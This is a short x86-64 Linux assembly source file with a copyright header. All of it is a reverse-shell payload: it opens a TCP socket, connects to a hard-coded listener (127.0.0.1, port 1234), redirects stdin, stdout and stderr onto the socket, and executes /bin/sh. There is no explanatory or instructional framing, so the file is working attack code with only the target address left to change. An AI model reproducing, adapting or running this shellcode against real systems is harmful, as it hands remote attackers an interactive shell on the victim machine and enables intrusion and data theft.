#
# Copyright 2014 Joseph Landry
#

.set	SYS_WRITE,1
.set	SYS_DUP2,33
.set	SYS_SOCKET,41
.set	SYS_CONNECT,42
.set	SYS_EXECVE,59
.set	SYS_EXIT,60

.set	PF_INET,2
.set	SOCK_STREAM,1
.set	IPPROTO_TCP,6
.set	SOCK_SIZE,16

.section .text
.global _start

_start:

socket:
	movq	$IPPROTO_TCP,%rdx
	movq	$SOCK_STREAM,%rsi
	movq	$PF_INET,%rdi
	movq	$SYS_SOCKET,%rax
	syscall

	cmp	$0,%rax
	jl	exit1
	mov	%rax,%r12

connect:
	movq	$SOCK_SIZE,%rdx
	lea	addr(%rip),%rsi
	movq	%r12,%rdi
	movq	$SYS_CONNECT,%rax
	syscall

	cmp	$0,%rax
	jl	exit1

dup2:
	movq	%r12,%rdi
	movq	$0,%rsi
	movq	$SYS_DUP2,%rax
	syscall

	cmp	$0,%rax
	jl	exit1

	inc	%rsi
	movq	$SYS_DUP2,%rax
	syscall

	cmp	$0,%rax
	jl	exit1

	inc	%rsi
	movq	$SYS_DUP2,%rax
	syscall

	cmp	$0,%rax
	jl	exit1



execve:
	pushq	$0
	mov	%rsp,%rdx
	pushq	$0
	mov	%rsp,%rsi
	lea	sh_string(%rip),%rdi
	movq	$SYS_EXECVE,%rax
	syscall

exit1:
	movq	$1,%rdi
	jmp	exit

exit0:
	movq	$0,%rdi

exit:
	movq	$SYS_EXIT,%rax
	syscall
	hlt

addr:
.short 2
.short 0xD204
.byte 127,0,0,1
sh_string:
.ascii "/bin/sh\000"
